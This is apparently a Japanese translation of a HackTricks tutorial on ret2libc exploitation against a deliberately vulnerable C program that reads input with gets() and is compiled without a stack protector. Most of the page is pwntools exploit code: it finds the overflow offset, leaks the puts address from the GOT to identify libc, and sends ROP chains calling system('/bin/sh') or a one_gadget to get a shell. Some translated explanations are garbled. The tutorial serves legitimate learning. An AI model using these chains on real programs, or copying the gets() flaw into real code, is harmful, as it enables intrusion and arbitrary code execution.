<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricks repo](https://github.com/carlospolop/hacktricks)と[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>


# クイックリサーム

1. **オーバーフローのオフセット**を見つける
2. `POP_RDI`、`PUTS_PLT`、`MAIN_PLT`のガジェットを**見つける**
3. 前述のガジェットを使用して、putsまたは別のlibc関数のメモリアドレスを**リーク**し、libcのバージョンを**見つける**（[ダウンロードする](https://libc.blukat.me)）
4. ライブラリを使用して、ROPを計算し、それを悪用する

# 他のチュートリアルとバイナリの練習

このチュートリアルでは、このチュートリアルで提案されたコード/バイナリを悪用します：[https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
他の便利なチュートリアル：[https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/)、[https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

# コード

ファイル名：`vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector  -no-pie
```
# ROP - LIBCアドレスの漏洩テンプレート

ここにあるコードを使用して、エクスプロイトを作成します。\
エクスプロイトをダウンロードし、脆弱性のあるバイナリと同じディレクトリに配置し、スクリプトに必要なデータを提供してください：

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# 1- オフセットの検出

テンプレートは、エクスプロイトを続行する前にオフセットが必要です。提供されていない場合、必要なコードを実行してオフセットを見つけます（デフォルトでは `OFFSET = ""`）。
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**実行** `python template.py` とすると、プログラムがクラッシュした状態でGDBコンソールが開かれます。その**GDBコンソール**内で `x/wx $rsp` を実行して、RIPを上書きする予定だった**バイト**を取得します。最後に、**python**コンソールを使用して**オフセット**を取得します。
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../.gitbook/assets/image (140).png>)

オフセット（この場合は40）を見つけた後、その値を使用してテンプレート内のOFFSET変数を変更します。\
`OFFSET = "A" * 40`

別の方法は、`pattern create 1000` -- _execute until ret_ -- `pattern seach $rsp`を使用することです。

# 2- ガジェットの検索

次に、バイナリ内のROPガジェットを見つける必要があります。これらのROPガジェットは、**libc**を見つけるために`puts`を呼び出すために役立ち、後で**最終的なエクスプロイトを実行**するために使用されます。
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
`PUTS_PLT`は**puts関数**を呼び出すために必要です。\
`MAIN_PLT`は、**オーバーフローを再度利用**するために、1つのインタラクション後に**main関数**を再度呼び出すために必要です（無限の利用可能なラウンド）。**それは各ROPの最後にプログラムを再度呼び出すために使用されます**。\
**POP_RDI**は、呼び出される関数に**パラメータ**を渡すために必要です。

このステップでは、実行する必要はありません。実行中にpwntoolsがすべてを見つけます。

# 3- LIBCライブラリの検索

今度は、使用されている**libc**ライブラリのバージョンを見つける時です。そのために、メモリ中の**puts関数**の**アドレス**を**リーク**し、そのアドレスにあるputsバージョンがどのライブラリバージョンにあるかを**検索**します。
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
これを行うために、実行されるコードの最も重要な行は次のとおりです：
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
これにより、**RIP** を**上書き**できるまでいくつかのバイトが送信されます：`OFFSET`。\
次に、ガジェット `POP_RDI` の**アドレス**が設定されます。これにより、次のアドレス（`FUNC_GOT`）が**RDI**レジストリに保存されます。これは、`PUTS_GOT`のアドレスがメモリ内のputs関数のアドレスが`PUTS_GOT`で指し示すアドレスに保存されるようにするためです。\
その後、`PUTS_PLT`が呼び出されます（**RDI**内に`PUTS_GOT`が含まれています）。これにより、putsは`PUTS_GOT`内のコンテンツ（メモリ内のputs関数のアドレス）を**読み取り**、それを**表示**します。\
最後に、**main関数が再度呼び出され**るため、オーバーフローを再度利用できます。

これにより、puts関数を**だまして**、**メモリ**内のputs関数の**アドレス**（libcライブラリ内にある）を**表示**させました。このアドレスがわかると、使用されている**libcのバージョンを調べる**ことができます。

![](<../../../.gitbook/assets/image (141).png>)

**ローカル**バイナリを**攻撃**しているため、使用されている**libc**のバージョンを特定する必要はありません（単に`/lib/x86_64-linux-gnu/libc.so.6`内のライブラリを見つければよいです）。\
ただし、リモート攻撃の場合は、以下で説明します。

## 3.1- libcバージョンの検索（1）

次のウェブページで使用されているライブラリを検索できます：[https://libc.blukat.me/](https://libc.blukat.me)\
また、見つかった**libc**のバージョンをダウンロードすることもできます。

![](<../../../.gitbook/assets/image (142).png>)

## 3.2- libcバージョンの検索（2）

次の手順を実行することもできます：

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

これには時間がかかるので、お待ちください。\
これが機能するためには、次の情報が必要です：

* Libcシンボル名：`puts`
* リークしたlibcアドレス：`0x7ff629878690`

これにより、おそらく使用されている**libc**を特定できます。
```
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
2つのマッチが見つかりました（最初のものが機能しない場合は、2番目のものを試してみてください）。最初のものをダウンロードしてください：
```
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
現在の作業ディレクトリにある `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` から libc をコピーします。

## 3.3- リークするための他の関数
```python
puts
printf
__libc_start_main
read
gets
```
# 4- ベースlibcアドレスの検索とexploiting

この時点で、使用されているlibcライブラリを知る必要があります。ローカルバイナリをexploitしているので、単に`/lib/x86_64-linux-gnu/libc.so.6`を使用します。

したがって、`template.py`の冒頭で**libc**変数を以下のように変更します：`libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it`

**libcライブラリのパス**を指定することで、**exploitの残りは自動的に計算されます**。

`get_addr`関数の中で、**libcのベースアドレス**が計算されます：
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
注意してください。**最終的なlibcのベースアドレスは00で終わる必要があります**。もしそうでない場合、間違ったライブラリが漏洩している可能性があります。
{% endhint %}

次に、`system`関数のアドレスと文字列`"/bin/sh"`の**アドレス**は、**libc**の**ベースアドレス**と与えられた**libcライブラリ**から**計算**されます。
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
最後に、/bin/shの実行エクスプロイトが準備され、送信されます。
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
最後のROPを説明しましょう。\
最後のROP (`rop1`) は再びmain関数を呼び出し、それから**オーバーフロー**を再び**悪用**することができます（そのために`OFFSET`が再びここにあります）。その後、`POP_RDI`を呼び出して、_"/bin/sh"_の**アドレス**(`BINSH`)を指し、**system**関数(`SYSTEM`)を呼び出したいのです。なぜなら、_"/bin/sh"_のアドレスがパラメータとして渡されるからです。\
最後に、**exit関数のアドレス**が**呼び出され**、プロセスが**正常に終了**し、アラートが生成されません。

**これにより、エクスプロイトは**_**/bin/sh**_**シェルを実行します。**

![](<../../../.gitbook/assets/image (143).png>)

# 4(2)- ONE\_GADGETの使用

[**ONE\_GADGET** ](https://github.com/david942j/one\_gadget)を使用して、**system**と**"/bin/sh"**を使用する代わりにシェルを取得することもできます。**ONE\_GADGET**は、libcライブラリ内で1つの**ROPアドレス**だけを使用してシェルを取得する方法を見つけます。\
ただし、通常いくつかの制約があります。最も一般的で回避しやすい制約は、`[rsp+0x30] == NULL`のようなものです。**RSP**内の値を制御できるため、さらにNULL値を送信して制約を回避するだけです。

![](<../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
# EXPLOITファイル

この脆弱性を悪用するためのテンプレートはこちらで見つけることができます：

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# よくある問題

## MAIN\_PLT = elf.symbols\['main'] が見つかりません

もし"main"シンボルが存在しない場合、mainのコードがどこにあるかを確認してください：
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
そして、アドレスを手動で設定します：
```python
MAIN_PLT = 0x401080
```
## Putsが見つかりません

バイナリがPutsを使用していない場合は、次のようなエラーメッセージを確認してください。

## `sh: 1: %s%s%s%s%s%s%s%s: not found`

すべてのエクスプロイトを作成した後に、次のような**エラー**が見つかった場合は、「/bin/sh」のアドレスから**64バイトを引く**ことを試してください。
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
